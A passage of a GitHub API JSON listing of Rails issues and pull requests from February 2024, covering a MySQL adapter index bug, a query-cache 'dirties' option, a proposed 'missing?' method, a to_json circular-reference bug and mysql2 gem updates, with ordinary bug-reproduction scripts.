            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 309390193,
                "node_id": "MDU6TGFiZWwzMDkzOTAxOTM=",
                "url": "https://api.github.com/repos/rails/rails/labels/MySQL",
                "name": "MySQL",
                "color": "fef2c0",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T10:30:11Z",
        "updated_at": "2024-02-27T22:48:28Z",
        "closed_at": "2024-02-27T21:29:50Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51206",
            "html_url": "https://github.com/rails/rails/pull/51206",
            "diff_url": "https://github.com/rails/rails/pull/51206.diff",
            "patch_url": "https://github.com/rails/rails/pull/51206.patch",
            "merged_at": "2024-02-27T21:29:50Z"
        },
        "body": "Fixes #51205.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51206/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51206/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51205",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51205/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51205/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51205/events",
        "html_url": "https://github.com/rails/rails/issues/51205",
        "id": 2156194801,
        "node_id": "I_kwDNIULOgITr8Q",
        "number": 51205,
        "title": "Mysql2 adapter raises when querying indexes that do not exist",
        "user": {
            "login": "drwl",
            "id": 1362443,
            "node_id": "MDQ6VXNlcjEzNjI0NDM=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1362443?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/drwl",
            "html_url": "https://github.com/drwl",
            "followers_url": "https://api.github.com/users/drwl/followers",
            "following_url": "https://api.github.com/users/drwl/following{/other_user}",
            "gists_url": "https://api.github.com/users/drwl/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/drwl/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/drwl/subscriptions",
            "organizations_url": "https://api.github.com/users/drwl/orgs",
            "repos_url": "https://api.github.com/users/drwl/repos",
            "events_url": "https://api.github.com/users/drwl/events{/privacy}",
            "received_events_url": "https://api.github.com/users/drwl/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 309390193,
                "node_id": "MDU6TGFiZWwzMDkzOTAxOTM=",
                "url": "https://api.github.com/repos/rails/rails/labels/MySQL",
                "name": "MySQL",
                "color": "fef2c0",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-27T10:12:27Z",
        "updated_at": "2024-02-28T07:08:27Z",
        "closed_at": "2024-02-27T21:29:50Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n```ruby\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"mysql2\"\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\nopts = { adapter: \"mysql2\",\r\n         host: \"localhost\",\r\n         username: \"root\",\r\n         password: \"root\",\r\n         database: \"mysql_adapter_index_diff\" }\r\n\r\nActiveRecord::Base.establish_connection(opts.except(:database))\r\nActiveRecord::Base.connection.drop_database(opts[:database])\r\nActiveRecord::Base.connection.create_database(opts[:database])\r\nActiveRecord::Base.establish_connection(opts)\r\n\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\n\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :posts, force: true do |t|\r\n  end\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_mysql_indexes_error\r\n    klass = Post\r\n    assert_raises(ActiveRecord::StatementInvalid) { klass.connection.indexes(\"table_that_does_not_exist\") }\r\n  end\r\nend\r\n\r\n# sqlite3\r\n#\r\n# ActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\n#\r\n# class BugTest < Minitest::Test\r\n#   def test_sqlite3_empty_array\r\n#     klass = Post\r\n#     assert_empty(klass.connection.indexes(\"table_that_does_not_exist\"))\r\n#   end\r\n# end\r\n```\r\n\r\n### Expected behavior\r\nIn the mysql test, it should return an empty array instead of raising. This would match the behaviors for postgres and sqlite3 adapters.\r\n\r\nIf you can uncomment the necessary sqlite test case, you can see that the test passes in returning an empty array.\r\n\r\n### Actual behavior\r\nMysql2 adapter raises when querying for indexes that don't exist.\r\n\r\n### System configuration\r\n**Rails version**:\r\nUsing rails 7.1.3.2 \r\nUsing mysql2 0.5.6\r\n**Ruby version**:\r\nruby 3.0.5p211 (2022-11-24 revision ba5cf0f7c5) [arm64-darwin22]",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51205/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51205/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51204",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51204/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51204/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51204/events",
        "html_url": "https://github.com/rails/rails/pull/51204",
        "id": 2156023139,
        "node_id": "PR_kwDNIULOaAO4lQ",
        "number": 51204,
        "title": "Add dirties option to Model.uncached",
        "user": {
            "login": "djmb",
            "id": 1734607,
            "node_id": "MDQ6VXNlcjE3MzQ2MDc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1734607?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/djmb",
            "html_url": "https://github.com/djmb",
            "followers_url": "https://api.github.com/users/djmb/followers",
            "following_url": "https://api.github.com/users/djmb/following{/other_user}",
            "gists_url": "https://api.github.com/users/djmb/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/djmb/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/djmb/subscriptions",
            "organizations_url": "https://api.github.com/users/djmb/orgs",
            "repos_url": "https://api.github.com/users/djmb/repos",
            "events_url": "https://api.github.com/users/djmb/events{/privacy}",
            "received_events_url": "https://api.github.com/users/djmb/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T08:52:17Z",
        "updated_at": "2024-02-27T09:54:33Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51204",
            "html_url": "https://github.com/rails/rails/pull/51204",
            "diff_url": "https://github.com/rails/rails/pull/51204.diff",
            "patch_url": "https://github.com/rails/rails/pull/51204.patch",
            "merged_at": null
        },
        "body": "\r\n\r\n### Motivation / Background\r\n\r\nThis is an alternative to https://github.com/rails/rails/pull/50721.\r\n\r\nFor [Solid Cache](https://github.com/rails/solid_cache), we want to be able to read and write from the cache database without using the query cache.\r\n\r\nWe also don't want to expire the query cache on other connection pools when we write. Writing to the Rails cache shouldn't invalidate the main query cache.\r\n\r\ncc @byroot, @jeremy \r\n\r\n### Detail\r\n\r\nThis adds a `dirties` option to `ActiveRecord::Base.uncached` and `ActiveRecord::ConnectionAdapters::ConnectionPool#uncached`.\r\n\r\nSetting `dirties` to `false`, means database writes to the connection pool will not mark any query caches as dirty.\r\n\r\nThe option defaults to `true` which retains the existing behaviour and clears query caches on all connection pools used by the current thread.\r\n\r\n### Additional information\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51204/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51204/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51203",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51203/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51203/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51203/events",
        "html_url": "https://github.com/rails/rails/pull/51203",
        "id": 2155987547,
        "node_id": "PR_kwDNIULOaAM5kQ",
        "number": 51203,
        "title": "Add a `.missing?` method as opposite for a `.exists?`",
        "user": {
            "login": "loqimean",
            "id": 49816584,
            "node_id": "MDQ6VXNlcjQ5ODE2NTg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/49816584?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/loqimean",
            "html_url": "https://github.com/loqimean",
            "followers_url": "https://api.github.com/users/loqimean/followers",
            "following_url": "https://api.github.com/users/loqimean/following{/other_user}",
            "gists_url": "https://api.github.com/users/loqimean/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/loqimean/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/loqimean/subscriptions",
            "organizations_url": "https://api.github.com/users/loqimean/orgs",
            "repos_url": "https://api.github.com/users/loqimean/repos",
            "events_url": "https://api.github.com/users/loqimean/events{/privacy}",
            "received_events_url": "https://api.github.com/users/loqimean/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T08:35:33Z",
        "updated_at": "2024-02-27T08:35:38Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51203",
            "html_url": "https://github.com/rails/rails/pull/51203",
            "diff_url": "https://github.com/rails/rails/pull/51203.diff",
            "patch_url": "https://github.com/rails/rails/pull/51203.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because we have so many syntax sugar, like for `present?` method we have `blank?`, and so on, so, that's would be really nice to add opposite method for a `exists?` instead of writing always `!`, or using unless\r\n\r\n### Detail\r\n\r\nThis Pull Request changes adds just an inverted `exists?` method called `missing?`. So, it's really simple, but powerful change\r\n\r\nRework of #51138 PR\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51203/reactions",
            "total_count": 3,
            "+1": 3,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51203/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51202",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51202/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51202/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51202/events",
        "html_url": "https://github.com/rails/rails/issues/51202",
        "id": 2155895447,
        "node_id": "I_kwDNIULOgIBalw",
        "number": 51202,
        "title": "Circular data structures raise SystemStackError when serializing them with `#to_json`.",
        "user": {
            "login": "Joerg-Seitz",
            "id": 22641313,
            "node_id": "MDQ6VXNlcjIyNjQxMzEz",
            "avatar_url": "https://avatars.githubusercontent.com/u/22641313?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Joerg-Seitz",
            "html_url": "https://github.com/Joerg-Seitz",
            "followers_url": "https://api.github.com/users/Joerg-Seitz/followers",
            "following_url": "https://api.github.com/users/Joerg-Seitz/following{/other_user}",
            "gists_url": "https://api.github.com/users/Joerg-Seitz/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Joerg-Seitz/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Joerg-Seitz/subscriptions",
            "organizations_url": "https://api.github.com/users/Joerg-Seitz/orgs",
            "repos_url": "https://api.github.com/users/Joerg-Seitz/repos",
            "events_url": "https://api.github.com/users/Joerg-Seitz/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Joerg-Seitz/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T07:48:32Z",
        "updated_at": "2024-02-28T09:11:38Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "Circular data structures raise a non helpful error message when serializing them with `#to_json`.\r\nHere only arrays and hashes are covered but I assume it could also apply to other arbitrary complex structures such as dependencies.\r\n\r\n### Steps to reproduce\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\nend\r\n\r\nrequire \"active_support\"\r\nrequire \"active_support/core_ext/object/blank\"\r\nrequire \"minitest/autorun\"\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_to_json_for_circular_arrays\r\n    self_nested_array = Array.new.tap{ |a| a.append a }\r\n\r\n    assert_equal self_nested_array.to_json, '[\"...\"]'\r\n  end\r\n\r\n  def test_to_json_for_circular_hashes\r\n    self_nested_hash = {}\r\n    self_nested_hash[0] = self_nested_hash\r\n\r\n    assert_equal self_nested_hash.to_json, '{\"0\":\"...\"}'\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\n**Preferred:**\r\nBased on the pure ruby output I'd assume a serialized value of `'...'` for the representation of the nested objects like arrays and hashes.\r\n```ruby\r\nirb(main):001> h = { }; h[1] = h\r\n=> {1=>{...}}\r\nirb(main):002> h.to_s\r\n=> \"{1=>{...}}\"\r\nirb(main):003> a = []; a << a\r\n=> [[...]]\r\nirb(main):004> a.to_s\r\n=> \"[[...]]\"\r\n\r\n```\r\n\r\n\r\n**Acceptable:**\r\nRaising a more helpful error message similar to what is returned from the json gem\r\n```\r\nirb(main):003> h.to_json\r\n(irb):3:in `to_json': nesting of 100 is too deep (JSON::NestingError)\r\n\tfrom (irb):3:in `<main>'\r\n\tfrom /Users/jorgseitz/.asdf/installs/ruby/3.1.4/lib/ruby/gems/3.1.0/gems/irb-1.11.2/exe/irb:9:in `<top (required)>'\r\n\tfrom /Users/jorgseitz/.asdf/installs/ruby/3.1.4/bin/irb:25:in `load'\r\n\tfrom /Users/jorgseitz/.asdf/installs/ruby/3.1.4/bin/irb:25:in `<main>'\r\nirb(main):004> a = []; a << a\r\n=> [[...]]\r\nirb(main):005> a.to_json\r\n(irb):5:in `to_json': nesting of 100 is too deep (JSON::NestingError)\r\n\tfrom (irb):5:in `<main>'\r\n\tfrom /Users/jorgseitz/.asdf/installs/ruby/3.1.4/lib/ruby/gems/3.1.0/gems/irb-1.11.2/exe/irb:9:in `<top (required)>'\r\n\tfrom /Users/jorgseitz/.asdf/installs/ruby/3.1.4/bin/irb:25:in `load'\r\n\tfrom /Users/jorgseitz/.asdf/installs/ruby/3.1.4/bin/irb:25:in `<main>'\r\n```\r\n\r\n### Actual behavior\r\nIt raises `SystemStackError: stack level too deep` due to an infinite loop and while this is unlikely it could theoretically lead to a segmentation fault crashing the ruby process.\r\n\r\n### System configuration\r\nruby version\r\n3.2.2\r\n\r\n### Additional information maybe it helps\r\nTo work around this issue our team had the following monkey patch in the codebase.\r\n```ruby\r\nrequire 'set'\r\n\r\n# Handle circular references\r\nmodule SaneAsJSON\r\n  def protect_sane_as_json(&block)\r\n    old = Thread.current[:seen]\r\n    Thread.current[:seen] ||= Set.new\r\n    Thread.current[:seen] << __id__\r\n    block.()\r\n  ensure\r\n    Thread.current[:seen] = old\r\n  end\r\n\r\n  def as_json(options = nil) #:nodoc:\r\n    if s = Thread.current[:seen] and s.member?(__id__)\r\n      :self\r\n    else\r\n      protect_sane_as_json { super }\r\n    end\r\n  end\r\nend\r\n\r\n[Array, Hash].each { |klass| klass.prepend(SaneAsJSON) }\r\n```\r\n\r\nThis stopped working due to the following change which is why I'm bringing it up now. https://github.com/rails/rails/commit/e8e8517f39db60e84bcace41a37c2fa2bb5194d0?diff=split&w=0#diff-c202bc84686ddd83549f9603008d8fb9f394a05e76393ff160b7c9494165fc4aR38-R40\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51202/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51202/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51201",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51201/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51201/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51201/events",
        "html_url": "https://github.com/rails/rails/pull/51201",
        "id": 2155771342,
        "node_id": "PR_kwDNIULOaABAYA",
        "number": 51201,
        "title": "Update mysql2 gem",
        "user": {
            "login": "loqimean",
            "id": 49816584,
            "node_id": "MDQ6VXNlcjQ5ODE2NTg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/49816584?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/loqimean",
            "html_url": "https://github.com/loqimean",
            "followers_url": "https://api.github.com/users/loqimean/followers",
            "following_url": "https://api.github.com/users/loqimean/following{/other_user}",
            "gists_url": "https://api.github.com/users/loqimean/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/loqimean/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/loqimean/subscriptions",
            "organizations_url": "https://api.github.com/users/loqimean/orgs",
            "repos_url": "https://api.github.com/users/loqimean/repos",
            "events_url": "https://api.github.com/users/loqimean/events{/privacy}",
            "received_events_url": "https://api.github.com/users/loqimean/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T06:30:59Z",
        "updated_at": "2024-02-27T06:35:45Z",
        "closed_at": "2024-02-27T06:31:58Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51201",
            "html_url": "https://github.com/rails/rails/pull/51201",
            "diff_url": "https://github.com/rails/rails/pull/51201.diff",
            "patch_url": "https://github.com/rails/rails/pull/51201.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because new version has updates that required on my Apple M2 chip processor, and I guess for other people it's also useful, because of easier install and just lib update :-)\r\n\r\n### Detail\r\n\r\nThis Pull Request updates a `mysql2` gem to version `0.5.6`\r\n\r\n### Additional information\r\n\r\nI have no additional info\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [ ] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51201/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51201/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51200",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51200/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51200/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51200/events",
        "html_url": "https://github.com/rails/rails/pull/51200",
        "id": 2155600421,
        "node_id": "PR_kwDNIULOZ_3qZg",
        "number": 51200,
        "title": "chore: update mysql2 to @0.5.6",
        "user": {
            "login": "JordanForeman",
            "id": 1462087,
            "node_id": "MDQ6VXNlcjE0NjIwODc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1462087?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/JordanForeman",
            "html_url": "https://github.com/JordanForeman",
            "followers_url": "https://api.github.com/users/JordanForeman/followers",
            "following_url": "https://api.github.com/users/JordanForeman/following{/other_user}",
            "gists_url": "https://api.github.com/users/JordanForeman/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/JordanForeman/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/JordanForeman/subscriptions",
            "organizations_url": "https://api.github.com/users/JordanForeman/orgs",
            "repos_url": "https://api.github.com/users/JordanForeman/repos",
            "events_url": "https://api.github.com/users/JordanForeman/events{/privacy}",
            "received_events_url": "https://api.github.com/users/JordanForeman/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 309390193,
                "node_id": "MDU6TGFiZWwzMDkzOTAxOTM=",
                "url": "https://api.github.com/repos/rails/rails/labels/MySQL",
                "name": "MySQL",
                "color": "fef2c0",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-27T03:59:36Z",
        "updated_at": "2024-02-27T15:15:42Z",
        "closed_at": "2024-02-27T15:15:38Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51200",
            "html_url": "https://github.com/rails/rails/pull/51200",
            "diff_url": "https://github.com/rails/rails/pull/51200.diff",
            "patch_url": "https://github.com/rails/rails/pull/51200.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nfixes https://github.com/rails/rails/issues/51199\r\n\r\nThis Pull Request has been created because [MySQL@8.3 removes a few APIs](https://dev.mysql.com/doc/relnotes/mysql/8.3/en/news-8-3-0.html) that the `mysql2` gem relied upon. This is fixed in the next patch release of `brianmario/mysql2` ([v0.5.6](https://github.com/brianmario/mysql2/releases/tag/0.5.6)).\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the specified version of the `mysql2` gem to be `>=0.5.6` to avoid installing a version that is incompatible with recent MySQL versions - namely `8.3.0`.\r\n\r\n### Additional information\r\n\r\nFWIW I am not familiar enough with Rails and its reliance on this gem to properly diagnose any potential negative side-effects with this change. It solves the immediate problem for me locally, but there is probably more due diligence to be done here, and I'd :heart: some guidance on the best way to ensure this change is solid. \r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* **N/A** Tests are added or updated if you fix a bug or add a feature.\r\n* **N/A** CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51200/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51200/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51199",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51199/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51199/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51199/events",
        "html_url": "https://github.com/rails/rails/issues/51199",
        "id": 2155584061,
        "node_id": "I_kwDNIULOgHuaPQ",
        "number": 51199,
        "title": "bundle install fails on Edge: mysql2 gem incompatible with MySQL@8.3",
        "user": {
            "login": "JordanForeman",
            "id": 1462087,
            "node_id": "MDQ6VXNlcjE0NjIwODc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1462087?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/JordanForeman",
            "html_url": "https://github.com/JordanForeman",
            "followers_url": "https://api.github.com/users/JordanForeman/followers",
            "following_url": "https://api.github.com/users/JordanForeman/following{/other_user}",
            "gists_url": "https://api.github.com/users/JordanForeman/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/JordanForeman/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/JordanForeman/subscriptions",
            "organizations_url": "https://api.github.com/users/JordanForeman/orgs",
            "repos_url": "https://api.github.com/users/JordanForeman/repos",
            "events_url": "https://api.github.com/users/JordanForeman/events{/privacy}",
            "received_events_url": "https://api.github.com/users/JordanForeman/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 309390193,
                "node_id": "MDU6TGFiZWwzMDkzOTAxOTM=",
                "url": "https://api.github.com/repos/rails/rails/labels/MySQL",
                "name": "MySQL",
                "color": "fef2c0",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
